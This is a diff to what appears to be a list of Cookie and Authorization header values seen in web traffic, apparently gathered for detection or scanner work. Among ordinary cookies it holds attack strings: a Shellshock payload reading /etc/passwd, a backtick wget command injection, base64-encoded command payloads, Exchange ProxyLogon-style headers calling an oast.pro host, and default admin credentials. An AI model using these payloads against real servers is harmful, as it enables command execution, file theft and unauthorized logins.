@@ -1,7 +1,10 @@
+() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
 47375647F5C6D68742424242478747E28363537343734242424216
 478747E2935353637323
+63=base64_; 38=decode; 98=98; 72=72; 16=YmFzZTY0; 66=X2RlY29kZQ; 78=WldOb2J5QW5NSGczWlNjNw==; 0=0
 79cfdd0e92b120faadd7eb253eb800d0
 ?(){:;};``',./"<>?|-[]~@$^*%ff\x00\x00\x00\x00\x00\x0a\xff=
+Authorization=Basic YWRtaW46YWRtaW4=
 Authorization=Basic YWrtaW46YWRtaW4=
 Authorization=Basic dGVsZWNvbWFkbWluOmxvbGVyMjAxOQ==
 Authorization=Basic dGVsZWNvbWFkbWluOnN1cGVyYWRtaW4=
@@ -23,6 +26,7 @@ LoginTimes=1; SESSIONID=boasid4566b876; UID=admin; PSW=vertex25
 LoginTimes=1; SESSIONID=boasid4566b876; UID=user3; PSW=1234
 PHPSESSID=20HyDW61oD9wwmZAMXh4iVVeoiQ
 PHPSESSID=2M7JbMwdDZC8nTQ1BRO1oiCacfD;
+PHPSESSID=a0d5959357e474aef655313f69891f37
 TWISTED_SESSION=no
 X-AnonResource=true; X-AnonResource-Backend=cfrbcab952g0buu01fh0sx8sdew4q5exc.oast.pro/ecp/default.flt?~3;
 X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;
@@ -32,6 +36,7 @@ Y=DnyP5/s0JCRbgFZfv+L49q5hjuwhM+cfmrOUmC/Qj+hsWi3MPFPhoKX6YY4QR3xq3LXYBSuYMohEoV
 \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
 __cfduid=387d46e23866efcf2b16a2169d68e2e485d1af9f775d
 __cfduid=4e8d79b4192881afa5bbd2f59f826e9a43719f9f3270
+_csrf=baacbabcabcaaccaababcbbcabacababaabaccbacaabaabbcbbcac;
 _ga=GA1.2.163966002.1612866791
 _ga=GA1.2.163966002.1612866791; _gid=GA1.2.1280108070.1620745746
 _ga=GA1.2.163966002.1612866791; _gid=GA1.2.353732362.1622924102
@@ -51,6 +56,8 @@ id=86897923176771237
 lang=id
 lang=ls
 language=en
+language=en; language=en; username=
+language=en; language=en; username=admin
 mac=00%3A1a%3A79%3A00%3A00%3A09; stb_lang=en; timezone=Europe/Amsterdam; adid=
 mac=00:1a:79:00:00:09; stb_lang=en; timezone=Europe/Amsterdam;
 mac=; stb_lang=undefined; timezone=undefined; adid=
@@ -64,6 +71,7 @@ rememberMe=me
 rememberMe=shodan
 rememberMe=test
 session=;
+sessionid='`wget http://127.0.0.1`'
 sesskey=
 sid=foo
 t('${d2dldCBodHRwOi8vMTI3LjAuMC4xLw==}')
@@ -73,4 +81,6 @@ testCookie=true
 uid=HQLFFU3LE1
 uid=R8tBjwtFc8
 uid=admin
+userLanguage=EN; username=admin
+userLanguage=EN; username=null
 wordpress_test_cookie=WP+Cookie+check
